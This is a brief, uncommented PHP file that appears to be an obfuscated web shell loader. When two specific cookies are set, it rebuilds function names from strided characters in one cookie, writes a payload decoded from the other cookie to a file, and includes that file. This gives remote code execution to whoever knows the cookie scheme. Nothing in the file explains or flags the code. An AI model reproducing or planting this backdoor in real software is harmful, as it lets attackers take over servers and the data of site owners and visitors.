<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[29])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 7;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[29][$n];
        if (!$c[29][$n + 1]) {
            if (!$c[29][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 7 + 1;
    }
    $k = $p[12]() . $p[1];
    if (!$p[3]($k)) {
        $n = $p[0]($k, $p[26]);
        $p[27]($n, $p[9] . $p[11]($p[16]($c[3])));
    }
    include($k);
}